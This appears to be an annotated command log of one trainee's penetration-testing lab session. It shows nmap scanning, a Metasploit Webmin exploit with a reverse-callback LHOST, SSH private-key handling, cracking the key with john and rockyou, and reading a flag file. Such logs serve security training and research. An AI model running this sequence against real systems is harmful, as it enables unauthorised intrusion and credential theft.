User 84 start time 1594798097 end 1594803700
PADDING
PADDING
PADDING
INPUT|84--0|M0 |1594798097|84|nmap 172.18.1.5|OUTPUT
INPUT|84--1|U|1594798210|84|nmap 172.18.1.5|OUTPUT
INPUT|84--2|U|1594798382|84|ls|OUTPUT
INPUT|84--3|U|1594798394|84|metasploit|OUTPUT
INPUT|84--4|U|1594798401|84|msf-console|OUTPUT
INPUT|84--5|U|1594798546|84|sudo service postgresql start|OUTPUT
INPUT|84--6|U|1594798562|84|sudo msfdb init|OUTPUT
INPUT|84--7|M2 |1594798611|84|msfconsole|OUTPUT
INPUT|84--8|M3 |1594798968|84|search webmin|OUTPUT
INPUT|84--9|A4|1594799041|84|use |OUTPUT
INPUT|84--10|A4|1594799045|84|use 2|OUTPUT
INPUT|84--11|A7|1594799049|84|check|OUTPUT
INPUT|84--12|M5 |1594799088|84|show options|OUTPUT
INPUT|84--13|A6|1594799140|84|set RHOST 172.18.1.5|OUTPUT
INPUT|84--14|M6 |1594799155|84|set RPORT 10000|OUTPUT
INPUT|84--15|A7|1594799164|84|check|OUTPUT
INPUT|84--16|U|1594799180|84|search webmin|OUTPUT
INPUT|84--17|A4|1594799196|84|use ~|OUTPUT
INPUT|84--18|A4|1594799205|84|use 3|OUTPUT
INPUT|84--19|U|1594799211|84|search webmin|OUTPUT
INPUT|84--20|A4|1594799214|84|use 3|OUTPUT
INPUT|84--21|U|1594799219|84|show options|OUTPUT
INPUT|84--22|U|1594799244|84|set SRVHOST 172.18.1.5|OUTPUT
INPUT|84--23|A7|1594799249|84|check|OUTPUT
INPUT|84--24|U|1594799271|84|set SRVHOST 0.0.0.0|OUTPUT
INPUT|84--25|U|1594799281|84|set RHOST 172.18.1.5|OUTPUT
INPUT|84--26|A7|1594799285|84|check|OUTPUT
INPUT|84--27|M8 |1594799344|84|exploit|OUTPUT
INPUT|84--28|U|1594799485|84|set LHOST 147.251.83.13|OUTPUT
INPUT|84--29|U|1594799495|84|exploit|OUTPUT
INPUT|84--30|U|1594799565|84|set LPORT 12345|OUTPUT
INPUT|84--31|U|1594799573|84|exploit|OUTPUT
INPUT|84--32|U|1594799922|84|set LHOST 100.100.100.2|OUTPUT
INPUT|84--33|U|1594799927|84|exploit|OUTPUT
INPUT|84--34|U|1594799935|84|set LPORT |OUTPUT
INPUT|84--35|U|1594799938|84|set LPORT 4444|OUTPUT
INPUT|84--36|U|1594799945|84|exploit|OUTPUT
INPUT|84--37|U|1594799975|84|set LHOST 10.1.135.83|OUTPUT
INPUT|84--38|U|1594801421|84|nmap 10.1.17.4|OUTPUT
INPUT|84--39|U|1594801430|84|ssh 10.1.17.4|OUTPUT
INPUT|84--40|M16 |1594801770|84|ssh eve@10.1.17.4|OUTPUT
INPUT|84--41|U|1594802420|84|cd .ssh|OUTPUT
INPUT|84--42|U|1594802422|84|ls|OUTPUT
INPUT|84--43|M12 |1594802431|84|nano id_rsa|OUTPUT
INPUT|84--44|U|1594802448|84|ssh-add id_rsaaaa|OUTPUT
INPUT|84--45|U|1594802455|84|ssh_add id_rsa|OUTPUT
INPUT|84--46|U|1594802470|84|ssh-add id_rsaa|OUTPUT
INPUT|84--47|U|1594802474|84|ssh-add id_rsa|OUTPUT
INPUT|84--48|A15|1594802509|84|chmod #033[2~ id_rsa|OUTPUT
INPUT|84--49|U|1594802634|84|exploit|OUTPUT
INPUT|84--50|M15 |1594802517|84|chmod 600 id_rsa|OUTPUT
INPUT|84--51|U|1594802520|84|ssh-add id_rsa|OUTPUT
INPUT|84--52|U|1594802528|84|ssh-add id_rsa|OUTPUT
INPUT|84--53|U|1594802540|84|ssh eve@10.1.17.4|OUTPUT
INPUT|84--54|U|1594802880|84|ls|OUTPUT
INPUT|84--55|U|1594802962|84|mv id_rsa ../id_rsa|OUTPUT
INPUT|84--56|U|1594802964|84|cd ..|OUTPUT
INPUT|84--57|U|1594802964|84|ll|OUTPUT
INPUT|84--58|U|1594802965|84|ls|OUTPUT
INPUT|84--59|U|1594802978|84|./ssh2john.py|OUTPUT
INPUT|84--60|U|1594802983|84|./ssh2john.py id_rsa|OUTPUT
INPUT|84--61|U|1594803009|84|./ssh2john.py id_rsa > hash|OUTPUT
INPUT|84--62|U|1594803013|84|ls|OUTPUT
INPUT|84--63|U|1594803031|84|joh hash --show|OUTPUT
INPUT|84--64|A14|1594803037|84|john hash --show|OUTPUT
INPUT|84--65|A14|1594803044|84|john hash --show|OUTPUT
INPUT|84--66|A14|1594803076|84|john hash --show|OUTPUT
INPUT|84--67|A14|1594803109|84|john hash|OUTPUT
INPUT|84--68|A14|1594803268|84|gunzip /usr/share/wordlists/rockyou.txt.gz|OUTPUT
INPUT|84--69|M14 |1594803314|84|john --wordlist=/usr/share/wordlists/rockyou.txt hash|OUTPUT
INPUT|84--70|U|1594803351|84|ssh eve@10.1.17.4|OUTPUT
INPUT|84--71|U|1594803425|84|john --wordlist=/usr/share/wordlists/rockyou.txt hash > result|OUTPUT
INPUT|84--72|U|1594803434|84|cat result|OUTPUT
INPUT|84--73|U|1594803467|84|ssh eve@10.1.17.4|OUTPUT
INPUT|84--74|U|1594803488|84|ssh eve@10.1.17.4|OUTPUT
INPUT|84--75|U|1594803530|84|mv id_rsa .ssh/id_rsa|OUTPUT
INPUT|84--76|U|1594803534|84|ssh eve@10.1.17.4|OUTPUT
INPUT|84--77|U|1594803571|84|ssh eve@10.1.17.4|OUTPUT
INPUT|84--78|U|1594803700|84|ls|OUTPUT
INPUT|84--79|U|1594803705|84|cat top-secret|OUTPUT
INPUT|84--80|U|1594803710|84|cd top-secret|OUTPUT
INPUT|84--81|M10 |1594803712|84|ls -la|OUTPUT
INPUT|84--82|M17 |1594803716|84|cat flag.txt|OUTPUT
INPUT|84--83|U|1594803700|84|ls|OUTPUT
